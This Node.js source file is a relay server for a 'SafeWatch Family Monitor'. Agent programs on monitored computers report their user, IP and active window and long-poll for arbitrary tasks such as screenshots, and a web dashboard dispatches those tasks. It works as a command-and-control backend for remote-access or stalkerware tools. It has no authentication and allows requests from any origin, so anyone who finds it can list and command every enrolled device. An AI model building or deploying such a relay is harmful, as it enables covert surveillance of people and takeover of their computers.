// SafeWatch Family Monitor — Relay Server
// Deploy on Render.com as a Web Service (node server.js)

const http   = require('http');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');

const PORT = process.env.PORT || 3000;

// ── SESSION STORE ─────────────────────────────────────────────────────
const sessions = {};

function getSession(id) {
    if (!sessions[id]) sessions[id] = {
        info: {}, lastSeen: 0,
        taskQueue: [], results: {},
        waitDash: {}, waitAgent: null
    };
    return sessions[id];
}

// Prune sessions older than 24h
setInterval(() => {
    const cut = Date.now() - 86400000;
    for (const id in sessions)
        if (sessions[id].lastSeen < cut) delete sessions[id];
}, 3600000);

// Mark offline after 35s no heartbeat
setInterval(() => {
    for (const id in sessions)
        if (Date.now() - sessions[id].lastSeen > 35000)
            sessions[id].info.online = false;
}, 5000);

// ── HTTP HELPERS ──────────────────────────────────────────────────────
const CORS = {
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type,x-agent-id',
};

function readBody(req) {
    return new Promise(r => {
        const c = [];
        req.on('data', d => c.push(d));
        req.on('end',  () => r(Buffer.concat(c)));
    });
}

function sendJSON(res, code, obj) {
    const b = Buffer.from(JSON.stringify(obj));
    res.writeHead(code, { ...CORS, 'Content-Type': 'application/json', 'Content-Length': b.length });
    res.end(b);
}

function sendRaw(res, buf, ct) {
    res.writeHead(200, { ...CORS, 'Content-Type': ct, 'Content-Length': buf.length });
    res.end(buf);
}

// ── MAIN ROUTER ───────────────────────────────────────────────────────
http.createServer(async (req, res) => {
    try {
        const u    = new URL(req.url, 'http://x');
        const p    = u.pathname;
        const qs   = u.searchParams;

        if (req.method === 'OPTIONS') { res.writeHead(204, CORS); res.end(); return; }

        // ── HEALTH / DASHBOARD ────────────────────────────────────────
        if (p === '/') {
            // Serve dashboard.html if it exists, otherwise text
            const dashPath = path.join(__dirname, 'dashboard.html');
            if (fs.existsSync(dashPath)) {
                const html = fs.readFileSync(dashPath);
                res.writeHead(200, { 'Content-Type': 'text/html', 'Content-Length': html.length });
                res.end(html);
            } else {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('Family Monitor Relay\n');
            }
            return;
        }

        // ── STATUS ────────────────────────────────────────────────────
        if (p === '/status') {
            const list = Object.entries(sessions).map(([id, s]) => ({
                id, pc: s.info.pc||id, user: s.info.user||'?',
                online: s.info.online && (Date.now()-s.lastSeen < 35000),
                seen: s.lastSeen
            }));
            return sendJSON(res, 200, { ok: true, sessions: list.length, online: list.filter(x=>x.online).length });
        }

        // ════════════════════════════════════════════════════════════
        // AGENT ROUTES  — called by EXE on the monitored device
        // ════════════════════════════════════════════════════════════

        // POST /agent/hello  — device registers itself
        if (p === '/agent/hello' && req.method === 'POST') {
            const b = JSON.parse((await readBody(req)).toString());
            const s = getSession(b.id);
            s.info = {
                pc: b.pc, user: b.user, home: b.home,
                ip: b.ip||'', os: b.os||'', win: '', mon: true, online: true
            };
            s.lastSeen = Date.now();
            console.log('[+] hello', b.id, b.pc, b.user, b.ip);
            return sendJSON(res, 200, { ok: true });
        }

        // GET /agent/poll?id=xxx  — long-poll, waits up to 25s for a task
        if (p === '/agent/poll' && req.method === 'GET') {
            const id = qs.get('id');
            if (!id) return sendJSON(res, 400, { error: 'missing id' });
            const s = getSession(id);
            s.lastSeen = Date.now();
            s.info.online = true;

            if (s.taskQueue.length > 0)
                return sendJSON(res, 200, s.taskQueue.shift());

            let timer;
            s.waitAgent = (task) => {
                clearTimeout(timer);
                s.waitAgent = null;
                if (!res.headersSent) sendJSON(res, 200, task || { type: 'noop' });
            };
            timer = setTimeout(() => { if (s.waitAgent) s.waitAgent(null); }, 25000);
            req.on('close', () => { clearTimeout(timer); s.waitAgent = null; });
            return;
        }

        // POST /agent/result?id=xxx&taskId=xxx&ct=xxx  — device sends back result
        if (p === '/agent/result' && req.method === 'POST') {
            const id     = qs.get('id');
            const taskId = qs.get('taskId');
            const ct     = qs.get('ct') || 'application/json';
            const buf    = await readBody(req);
            const s      = getSession(id);
            s.lastSeen   = Date.now();
            s.info.online = true;

            if (s.waitDash[taskId]) {
                const dr = s.waitDash[taskId];
                delete s.waitDash[taskId];
                if (!dr.headersSent) sendRaw(dr, buf, ct);
            } else {
                s.results[taskId] = { data: buf, ct };
                setTimeout(() => delete s.results[taskId], 30000);
            }
            return sendJSON(res, 200, { ok: true });
        }

        // POST /agent/beat?id=xxx  — heartbeat every 15s
        if (p === '/agent/beat' && req.method === 'POST') {
            const id = qs.get('id');
            if (!id) return sendJSON(res, 400, { error: 'missing id' });
            const b  = JSON.parse((await readBody(req)).toString());
            const s  = getSession(id);
            s.lastSeen    = Date.now();
            s.info.online = true;
            s.info.win    = b.win || '';
            s.info.mon    = b.mon !== false;
            return sendJSON(res, 200, { ok: true });
        }

        // ════════════════════════════════════════════════════════════
        // DASHBOARD ROUTES  — called by the browser
        // ════════════════════════════════════════════════════════════

        // GET /dash/sessions  — list all known agents
        if (p === '/dash/sessions') {
            const list = Object.entries(sessions).map(([id, s]) => ({
                id,
                pc:     s.info.pc    || id,
                user:   s.info.user  || '?',
                home:   s.info.home  || '',
                ip:     s.info.ip    || '',
                os:     s.info.os    || '',
                win:    s.info.win   || '',
                mon:    s.info.mon   !== false,
                online: s.info.online && (Date.now() - s.lastSeen < 35000),
                seen:   s.lastSeen,
            }));
            return sendJSON(res, 200, list);
        }

        // POST /dash/task  — send a task to an agent, wait for result
        if (p === '/dash/task' && req.method === 'POST') {
            const b = JSON.parse((await readBody(req)).toString());
            const s = sessions[b.id];
            if (!s) return sendJSON(res, 404, { error: 'agent not found — is the device online?' });

            const taskId  = crypto.randomBytes(8).toString('hex');
            const task    = { taskId, type: b.type, payload: b.payload || '' };
            const timeout = b.type === 'screenshot' ? 16000 : 12000;

            // Wake the agent if it's long-polling
            if (s.waitAgent) {
                const wa = s.waitAgent;
                s.waitAgent = null;
                wa(task);
            } else {
                s.taskQueue.push(task);
            }

            // Result already in cache?
            if (s.results[taskId]) {
                const r = s.results[taskId];
                delete s.results[taskId];
                return sendRaw(res, r.data, r.ct);
            }

            // Wait for result
            s.waitDash[taskId] = res;
            const t = setTimeout(() => {
                delete s.waitDash[taskId];
                if (!res.headersSent)
                    sendJSON(res, 504, { error: 'Agent timeout — device may be sleeping or offline' });
            }, timeout);
            req.on('close', () => { clearTimeout(t); delete s.waitDash[taskId]; });
            return;
        }

        sendJSON(res, 404, { error: 'not found' });

    } catch(err) {
        console.error('Request error:', err.message);
        try { sendJSON(res, 500, { error: err.message }); } catch {}
    }

}).listen(PORT, '0.0.0.0', () => {
    console.log('SafeWatch Family Monitor Relay — port', PORT);
});
